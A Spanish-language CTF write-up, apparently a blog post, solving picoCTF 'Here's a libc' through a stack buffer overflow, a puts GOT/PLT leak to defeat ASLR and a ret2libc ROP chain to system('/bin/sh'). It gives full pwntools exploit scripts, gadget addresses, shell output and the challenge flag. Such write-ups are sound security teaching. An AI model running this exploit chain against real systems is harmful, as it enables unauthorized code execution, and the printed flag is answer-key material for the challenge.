---
layout: post
title: picoCTF Here's a libc - ret2libc y bypass ASLR
author: c4rta
date: 2023-01-24
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, ret2libc, ROP, ASLR bypass]
image: /assets/img/hereLibc/waifu.jpg
---
Realizaremos un ataque ret2libc para hacer bypass de NX, ademas usaremos puts en GOT y PLT para lekear valores y evadir el ASLR

{:.lead}

## Analisis

Para no hacerlo tan largo por que no es la gran cosa el codigo, me voy a ir directamente a la funcion importante que se llama ```do_stuff```, como ingrese el codigo a radare quiero resalar que:

La variable que toma nuestro input de esta declarando como ```var uint32_t var_8h @ rbp-0x8``` la cual recibe 112 bytes

La funcion que recibe nuestro input ```scanf``` no esta limitando los caracteres que le metemos:

```
0x004006fe      e87dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00400703      488d857fffff.  lea rax, [var_81h]
│           0x0040070a      4889c6         mov rsi, rax
│           0x0040070d      488d3d260200.  lea rdi, [0x0040093a]       ; "%c" ; const char *format
│           0x00400714      b800000000     mov eax, 0
```
Y ademas en esto de arriba se esta usando la variable ```var_81h``` ya que nuestro input lo transforma de minusculas a mayusculas y viceversa

## Crafteando el exploit - parte 1

### Sacando el offset de el RIP

Una vez sabiendo que tenemos un buffer de 112 y no hay un limite para nuestro input entonces pasaremos a sacer el offset de el RIP

Con gdb y el comando ```cyclic 200``` generare 200 bytes que le pasare como input al programa, una vez que pete para sacar el desplazamiento para llegar al RIP podemos usar el offset del RBP y sumarle 8 o tomar 8 bytes de el RSP, yo tomare 8 de el RSP y queda asi:

```
pwndbg> cyclic -l raaaaaaa
Lookup value: b'raaaaaaa'
136
```
Y el desplazamiento para llegar al RIP es 136.

Ahora, el binario tiene NX, asi que no podemos ejecutar una shellcode en el stack asi que podemos recurrir a tecnicas que usen ROP, como ret2libc, y lo mas clasico es sacar la direccion de ```system``` y ```/bin/sh```, el problema es que tenemos ASLR asi que podemos hacer uso de un clasico, hacer uso de la funcion ```puts``` para lekear valores, para esto tenemos que sacar la direccion de ```puts``` en PLT y como esta funcion espera un argumento, podemos usar ```puts``` pero ahora en GOT y otro clasico es usar ```setbuf``` en GOT pero en esta caso usare ```puts```, ademas como estamos en x64 tenemos que poner ```RDI``` como primer argumento en una funcion

### puts en PLT y puts en GOT

Para sacar puts en PLT podemos usar: ```objdump -d vuln_patched | grep puts``` y esto nos da:

```
0000000000400540 <puts@plt>:
  400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip)        # 601018 <puts@GLIBC_2.2.5>
  400769:	e8 d2 fd ff ff       	call   400540 <puts@plt>
  400891:	e8 aa fc ff ff       	call   400540 <puts@plt>
```
Y vamos a ocupar la ```400540```

Y para sacer puts en GOT podemos usar: ```objdump -R vuln_patched | grep puts```:

```0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5```

Y es la ```601018```

### pop rdi

Para sacar esto podemos hacer uso de ```ropper```, ```ROPGadget``` o radare con el comando ```/R```, en mi caso usare ropper con el comando ```ropper -f vuln_patched | grep 'rdi'``` y usaremos este ```0x0000000000400913: pop rdi; ret; ```

Esto lo hacemos ya que debemos de meter puts en GOT en rdi 

### Direccion de main

Otra cosa importante es la direccion de main, ya que con esta el programa sabra a donde regresar o no petara

```
readelf -s vuln | grep main                                                                                                                          ─╯
    63: 0000000000400771   305 FUNC    GLOBAL DEFAULT   13 main
```

### Ejecutando el exploit

```py
from pwn import *

host = "mercury.picoctf.net"
puerto = 42072 #<-- Esto lo cambias

p = remote(host,puerto)

padding = b"A" * 136
pop_rdi = 0x400913
puts_got = 0x601018
puts_plt = 0x400540
main = 0x400771

payload = padding
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
p.sendline(payload)
p.recvline()

puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Direccion de puts en tiempo de ejecucion: {hex(puts)}")
```

Ahora ya tenemos la direccion de ```puts``` en tiempo de ejecucion:

```bash
python3 exploit.py                                                ─╯
[+] Opening connection to mercury.picoctf.net on port 42072: Done
[*] Direccion de puts en tiempo de ejecucion: 0x7f6d50592a30
[*] Closed connection to mercury.picoctf.net port 42072
```

## Crafteando el exploit - parte 2

### Direccion base de libc

Para esto tenemos que sacar el offset de puts en libc y restarselo a la direccion de puts en tiempo de ejecucion

Con el comando: ```readelf -s libc.so.6 | grep puts``` podemos sacar el offset de puts en libc:

```422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5```

El cual es: ```80a30```

```py
from pwn import *

host = "mercury.picoctf.net"
puerto = 42072 #<-- Esto lo cambias

p = remote(host,puerto)

padding = b"A" * 136
pop_rdi = 0x400913
puts_got = 0x601018
puts_plt = 0x400540
main = 0x400771

payload = padding
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
p.sendline(payload)
p.recvline()

puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Direccion de puts en tiempo de ejecucion: {hex(puts)}")

offset_puts = 0x80a30

libc = puts - offset_puts
log.info(f'Direccion base de libc: {hex(libc)}')  
```

Ahora ya tenemos la direccion base de libc:

```bash
python3 exploit.py                                                ─╯
[+] Opening connection to mercury.picoctf.net on port 42072: Done
[*] Direccion de puts en tiempo de ejecucion: 0x7f9fa002ca30
[*] Direccion base de libc: 0x7f9f9ffac000
[*] Closed connection to mercury.picoctf.net port 42072
```

### Direccion de system y /bin/sh

System:

```
readelf -s libc.so.6 | grep system                                       ─╯
  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

/bin/sh:

```
strings -atx libc.so.6 | grep /bin/sh                                                                                                                ─╯
 1b40fa /bin/sh
```
Esto lo hacemos por que debemos de llamar a system con /bin/sh, y para eso debemos de usar otra vez ```pop rdi``` 

Adicionalmente ocupamos la direccion de ```ret``` antes de llamar a system por cuestiones de stack alignment (la direccion la saque con ropper)

### Exploit final

```py
from pwn import *

host = "mercury.picoctf.net"
puerto = 42072 #<-- Esto lo cambias

p = remote(host,puerto)

padding = b"A" * 136
pop_rdi = 0x400913
puts_got = 0x601018
puts_plt = 0x400540
main = 0x400771

payload = padding
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
p.sendline(payload)
p.recvline()

puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Direccion de puts en tiempo de ejecucion: {hex(puts)}")

offset_puts = 0x80a30

libc = puts - offset_puts
log.info(f'Direccion base de libc: {hex(libc)}')  

offset_system = 0x4f4e0
offset_bin_sh = 0x1b40fa

system = libc + offset_system
bin_sh = libc + offset_bin_sh 

payload = padding
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(0x40052e)
payload += p64(system)

p.sendline(payload)
p.interactive()
```
### Flag

Y ahora ya tenemos la flag:

```bash
python3 exploit.py                                                ─╯
[+] Opening connection to mercury.picoctf.net on port 42072: Done
[*] Direccion de puts en tiempo de ejecucion: 0x7f8fa1699a30
[*] Direccion base de libc: 0x7f8fa1619000
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_3a9ee516616d21b3}
$ whoami
here-s-a-libc_0
```

Eso ha sido todo, gracias por leer ❤